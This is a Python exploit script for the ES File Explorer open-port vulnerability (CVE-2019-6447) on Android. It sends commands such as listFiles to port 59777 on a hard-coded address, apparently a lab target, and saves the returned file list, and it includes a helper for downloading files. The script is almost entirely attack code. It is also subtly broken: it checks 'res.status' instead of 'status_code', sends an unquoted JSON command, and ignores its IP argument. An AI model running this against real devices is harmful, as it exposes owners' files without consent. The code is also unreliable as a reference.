
import requests
import sys
import os
import argparse

#################################################
#
#   Loosely based on the following scripts:
#   
#   https://github.com/fs0c131y/ESFileExplorerOpenPortVuln/blob/master/poc.py
#       and
#   https://www.exploit-db.com/exploits/50070
#
#
#################################################



cmd_options = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','listAppsThumbnail','getDeviceInfo']

post_headers = {"Content-Type": "application/json"}

addr='10.10.10.247'

url='http://'+ addr + ':59777'

def fetch_android_file(filename):
    res = requests.get(url+filename)
    if res.status == 200:
        with open(filename, 'wb') as f:
            f.write(res.content)


def get_all_files(file_list):
    for file_elem in file_list:
        if file_elem["type"] == "file":
            filename = file_elem["name"]
            print("file:", filename)
            #fetch_android_file(filename)
        else:
            print("Not a valid file")



def setup_options():
    parser = argparse.ArgumentParser(description='Retrieve files from an Android device, exploiting the ES File Explorer vulnerability (CVE-2019-6447)')
    parser.add_argument('cmd', nargs=1, choices=cmd_options, help='The command to be executed on the ES File Explorer')
    #parser.add_argument('ip', dest='addr', help='IP address of target machine')
    parser.add_argument('ip', nargs=1, help='IP address of target machine')
    args = parser.parse_args()
    return args

def basic_command():
    args = setup_options()
    cmd=args.cmd[0]
    payload_data = '{"command":' + cmd + '}'
    print("args:", args)
    print("cmd:", cmd)

    if cmd == 'listFiles':
        print("listFiles command successfully received")
        res = requests.post(url, headers=post_headers, data=payload_data)
        if res.status_code == 200:
            with open("file_list.txt",'wb') as f:
                f.write(res.content)
    #if cmd == "getFile":
    #    filelist="file_list.txt"
    #    print(filelist)



if __name__ == '__main__':
    basic_command()
